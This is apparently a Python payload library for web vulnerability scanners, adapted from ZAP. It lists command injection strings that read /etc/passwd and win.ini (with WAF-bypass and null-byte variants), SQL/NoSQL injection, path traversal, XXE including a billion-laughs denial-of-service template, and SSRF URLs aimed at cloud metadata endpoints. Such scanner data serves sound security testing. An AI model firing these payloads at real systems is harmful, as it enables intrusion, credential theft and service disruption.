"""
Shared payload libraries for all scanners.
Extracted from ZAP source code.
"""

def insert_uninit_var(cmd: str) -> str:
    """
    Insert uninitialized variable ($u) between spaces and slashes for WAF bypass.
    Based on ZAP's insertUninitVar function.
    Example: 'cat /etc/passwd' -> 'cat $u/etc$u/passwd'
    """
    return cmd.replace(' ', '$u ').replace('/', '$u/')


class PayloadLibrary:
    # SQL Injection
    SQL_ERROR_PAYLOADS = ["'", "\"", ";", "'(", ")", "(", "NULL"]
    
    # Command Injection (Comprehensive ZAP List - 73 total variants)
    # Unix Variants (47 variants including WAF bypass)
    UNIX_CMD_PAYLOADS = [
        # No Quotes
        "cat /etc/passwd", "&cat /etc/passwd&", ";cat /etc/passwd;", "|cat /etc/passwd",
        # Quotes (Double/Single)
        "\"&cat /etc/passwd&\"", "\";cat /etc/passwd;\"", "'&cat /etc/passwd&'", "';cat /etc/passwd;'",
        # Special Chars & Bypasses
        "\ncat /etc/passwd\n", "`cat /etc/passwd`", "$(cat /etc/passwd)", "||cat /etc/passwd",
        "|cat /etc/passwd#", "&&cat /etc/passwd",
        # Null Byte Injection (No Quotes)
        ";cat /etc/passwd\x00", "&cat /etc/passwd\x00",
        # Null Byte Injection (Double Quotes)
        "\"&cat /etc/passwd\x00", "\";cat /etc/passwd\x00",
        # Null Byte Injection (Single Quotes)
        "'&cat /etc/passwd\x00", "';cat /etc/passwd\x00",
        # Null Byte Injection (Special Chars)
        "||cat /etc/passwd\x00", "&&cat /etc/passwd\x00",
        # WAF Bypass (Uninitialized Variable) - No Quotes
        "&" + insert_uninit_var("cat /etc/passwd") + "&",
        ";" + insert_uninit_var("cat /etc/passwd") + ";",
        # WAF Bypass - Double Quotes
        "\"&" + insert_uninit_var("cat /etc/passwd") + "&\"",
        "\";" + insert_uninit_var("cat /etc/passwd") + ";\"",
        # WAF Bypass - Single Quotes
        "'&" + insert_uninit_var("cat /etc/passwd") + "&'",
        "';" + insert_uninit_var("cat /etc/passwd") + ";'",
        # WAF Bypass - Special Chars
        "\n" + insert_uninit_var("cat /etc/passwd") + "\n",
        "`" + insert_uninit_var("cat /etc/passwd") + "`",
        "||" + insert_uninit_var("cat /etc/passwd"),
        "&&" + insert_uninit_var("cat /etc/passwd"),
        "|" + insert_uninit_var("cat /etc/passwd") + "#",
        # WAF Bypass with Null Byte
        "&" + insert_uninit_var("cat /etc/passwd") + "\x00",
        ";" + insert_uninit_var("cat /etc/passwd") + "\x00",
        "\"&" + insert_uninit_var("cat /etc/passwd") + "\x00",
        "\";" + insert_uninit_var("cat /etc/passwd") + "\x00",
        "'&" + insert_uninit_var("cat /etc/passwd") + "\x00",
        "';" + insert_uninit_var("cat /etc/passwd") + "\x00",
        "||" + insert_uninit_var("cat /etc/passwd") + "\x00",
        "&&" + insert_uninit_var("cat /etc/passwd") + "\x00",
        # Time-Based (Blind)
        "sleep 5", ";sleep 5;", "&sleep 5&", "|sleep 5", "`sleep 5`", "$(sleep 5)"
    ]
    
    # Windows Variants (20 variants)
    WINDOWS_CMD_PAYLOADS = [
        # Standard
        "type %SYSTEMROOT%\\win.ini", 
        "& type %SYSTEMROOT%\\win.ini", 
        "| type %SYSTEMROOT%\\win.ini",
        "&& type %SYSTEMROOT%\\win.ini",
        # Quotes (Double/Single)
        "\"& type %SYSTEMROOT%\\win.ini", "\"| type %SYSTEMROOT%\\win.ini",
        "'& type %SYSTEMROOT%\\win.ini", "'| type %SYSTEMROOT%\\win.ini",
        # Exec
        "run type %SYSTEMROOT%\\win.ini",
        "cmd /c type %SYSTEMROOT%\\win.ini",
        # Null Byte Injection
        "& type %SYSTEMROOT%\\win.ini\x00", "| type %SYSTEMROOT%\\win.ini\x00",
        "\"& type %SYSTEMROOT%\\win.ini\x00", "\"| type %SYSTEMROOT%\\win.ini\x00",
        "'& type %SYSTEMROOT%\\win.ini\x00", "'| type %SYSTEMROOT%\\win.ini\x00",
        "run type %SYSTEMROOT%\\win.ini\x00",
        # Time-Based (Blind)
        "timeout /t 5", "& timeout /t 5", "| timeout /t 5"
    ]
    
    # PowerShell Variants (6 variants)
    POWERSHELL_CMD_PAYLOADS = [
        "get-help", ";get-help", "get-help #", "& get-help",
        "\";get-help", "';get-help"
    ]
    
    # Path Traversal
    PATH_TRAVERSAL_PAYLOADS = [
        "../", "..\\", "%2e%2e%2f", "%252e%252e%252f", "....//", "....\\\\",
        "../../../../etc/passwd",
        "..\\..\\..\\..\\Windows\\win.ini",
        "file:///etc/passwd",
        "file:///c:/Windows/win.ini"
    ]
    
    # External Redirect (ZAP 14 Variants - Complete)
    EXTERNAL_REDIRECT_PAYLOADS = [
        # Target: {uuid}.owasp.org
        "{uuid}.owasp.org",                          # PLAIN_SITE (domain only)
        "http://{uuid}.owasp.org",                   # HTTP
        "https://{uuid}.owasp.org",                  # HTTPS_SITE
        "//{uuid}.owasp.org",                        # NO_SCHEME
        "\\\\{uuid}.owasp.org",                      # NO_SCHEME_WRONG_SLASH
        "HtTpS://{uuid}.owasp.org",                  # HTTPS_MIXED_CASE
        "HtTp://{uuid}.owasp.org",                   # HTTP_MIXED_CASE
        "https://{uuid}.owasp.org/?{orig}",          # HTTPS_ORIG_PARAM
        "https://{uuid_enc}.owasp.org",              # HTTPS_PERIOD_ENCODE
        "https://\\{uuid}.owasp.org",                # HTTPS_WRONG_SLASH
        "http://\\{uuid}.owasp.org",                 # HTTP_WRONG_SLASH
        # Note: Scanner will format {uuid} and {uuid_enc}
    ]
    # Header specific Redirects (3 variants)
    REDIRECT_HEADER_PAYLOADS = [
        "5;URL='https://{uuid}.owasp.org'",          # HTTPS_REFRESH
        "URL='http://{uuid}.owasp.org'",            # HTTP_LOCATION
        "5;URL='https://{uuid}.owasp.org/?{orig}'"  # HTTPS_REFRESH_ORIG_PARAM
    ]
    
    # XXE (Complete - 4 templates)
    XXE_PAYLOADS = [
        # Basic Entity (File Disclosure)
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{target}">]><foo>&xxe;</foo>',
        # Parameter Entity
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{target}"> %xxe;]><foo></foo>',
        # OAST (Out-of-Band)
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oast_host}">]><foo>&xxe;</foo>',
        # Billion Laughs (DoS)
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>'
    ]
    
    XXE_TARGETS = {
        "unix": "file:///etc/passwd",
        "windows": "file:///c:/Windows/win.ini"
    }

    # Parameter Tampering Chars
    PARAM_TAMPER_CHARS = ["@", "+", "%00", "|", "!"]

    # Rate Limiting Test
    RATE_LIMIT_BURST_SIZE = 100  # Requests per second

    # Advanced Polyglots (SQLi + XSS + NoSQLi + Command Inj)
    # Context breakers
    POLYGLOT_PAYLOADS = [
        "SLEEP(5) /*' or SLEEP(5) or '\" or SLEEP(5) or \"*/",  # Generic SQLi Time
        "' OR '1'='1' --",
        "admin' --",
        "admin' #",
        "'/*", 
        "' or 1=1--",
        "\" or 1=1--",
        "test') OR 1=1--",
        
        # NoSQL / JSON 
        "{\"gt\": \"\"}", 
        "{\"$gt\": \"\"}",
        "{\"$ne\": null}",
        
        # Command 
        "| timeout /t 5", 
        "| sleep 5",
        "; sleep 5",
        
        # Massive Polyglot (Seclists inspired)
        "javascript://%250Aalert(1)//\"/*'*/-->"
    ]

    # SSRF Obfuscation Payloads (127.0.0.1 variants)
    SSRF_OBFUSCATED = [
        "http://2130706433",          # Decimal
        "http://0x7f000001",          # Hex w/o dots
        "http://0x7f.0.0.1",          # Hex dots
        "http://0177.0.0.1",          # Octal
        "http://127.1",               # Short
        "http://0.0.0.0:8888",        # 0.0.0.0 often maps to localhost
        "http://[::]:8888",           # IPv6
        "http://localtest.me:8888",   # DNS Rebinding domain
        "http://127.0.0.1.nip.io:8888" # DNS Rebinding domain
    ]

    # Cloud Metadata SSRF (AWS, GCP, Azure, Alibaba)
    SSRF_CLOUD_METADATA = [
        "http://169.254.169.254/latest/meta-data/",        # AWS, Azure, GCP
        "http://169.254.169.254/computeMetadata/v1/",      # GCP
        "http://100.100.100.200/latest/meta-data/",        # Alibaba
        "http://instance-data/latest/meta-data/"           # Generic
    ]

    # NoSQL Injection (MongoDB, etc.)
    NOSQL_PAYLOADS = [
        {"$ne": None},      # Bypass auth
        {"$gt": ""},        # Bypass auth
        {"$where": "sleep(5000)"}, # Time-based
        "'; return true; var foo='", # JS Injection
        "{\"$ne\": null}",
        "{\"$gt\": \"\"}"
    ]

    # IDOR / BOLA Payloads
    IDOR_TEST_IDS = [0, 1, 35, 1337, 9999]
    IDOR_SELF_ALIASES = ["me", "self", "current", "my"]
    IDOR_DEFAULT_USERS = ["admin", "Admin", "root", "test"]


